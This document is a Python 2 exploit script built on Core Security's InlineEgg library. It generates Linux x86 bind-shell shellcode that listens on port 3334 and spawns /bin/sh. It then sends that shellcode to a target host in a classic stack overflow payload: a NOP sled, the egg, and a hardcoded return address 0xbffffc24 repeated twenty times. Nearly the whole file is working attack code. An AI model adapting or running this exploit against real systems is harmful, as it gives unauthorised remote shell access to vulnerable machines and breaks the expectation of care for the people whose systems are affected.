#!/usr/bin/python
#--
# Copyright (c) 2002,2003 Core Security Technologies, Core SDI Inc.
# All rights reserved.
#
#    Unless you have express writen permission from the Copyright Holder, any
# use of or distribution of this software or portions of it, including, but not
# limited to, reimplementations, modifications and derived work of it, in
# either source code or any other form, as well as any other software using or
# referencing it in any way, may NOT be sold for commercial gain, must be
# covered by this very same license, and must retain this copyright notice and
# this license.
#    Neither the name of the Copyright Holder nor the names of its contributors
# may be used to endorse or promote products derived from this software
# without specific prior written permission.
#
# THERE IS NO WARRANTY FOR THE SOFTWARE, TO THE EXTENT PERMITTED BY APPLICABLE
# LAW. EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR
# OTHER PARTIES PROVIDE THE SOFTWARE "AS IS" WITHOUT WARRANTY OF ANY KIND,
# EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. THE
# ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE SOFTWARE IS WITH YOU.
# SHOULD THE SOFTWARE PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY
# SERVICING, REPAIR OR CORRECTION.
#
# IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL
# ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR REDISTRIBUTE
# THE SOFTWARE AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
# GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE
# OR INABILITY TO USE THE SOFTWARE (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR
# DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR
# A FAILURE OF THE SOFTWARE TO OPERATE WITH ANY OTHER SOFTWARE), EVEN IF SUCH
# HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
#
# gera [at corest.com]
#--

from inlineegg.inlineegg import *
import socket
import struct
import sys

def listenShellEgg(listen_addr, listen_port):

#   egg = InlineEgg(FreeBSDx86Syscall)
#   egg = InlineEgg(OpenBSDx86Syscall)
   egg = InlineEgg(Linuxx86Syscall)

   # bind to port and listen
   sock = egg.socket(socket.AF_INET,socket.SOCK_STREAM)
   sock = egg.save(sock)
   egg.bind(sock, (listen_addr, listen_port))
   egg.listen(sock,1)

   client = egg.accept(sock, 0, 0)
   client = egg.save(client)
   egg.close(sock)

   egg.dup2(client, 0)
   egg.dup2(client, 1)
   egg.dup2(client, 2)
   egg.execve('/bin/sh',('bash','-i'))

   print "Egg len: %d" % len(egg)
   return egg

def main():
   if len(sys.argv) < 3:
      raise Exception, "Usage: %s <target ip> <target port>"

   # connect to target
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.connect((sys.argv[1], int(sys.argv[2])))

   # create egg
   egg = listenShellEgg('0.0.0.0',3334)

   # exploit

   retAddr = struct.pack('<L',0xbffffc24L)
   toSend  = "\x90"*(1024-len(egg))
   toSend += egg.getCode()
   toSend += retAddr*20

   sock.send(toSend)

main()
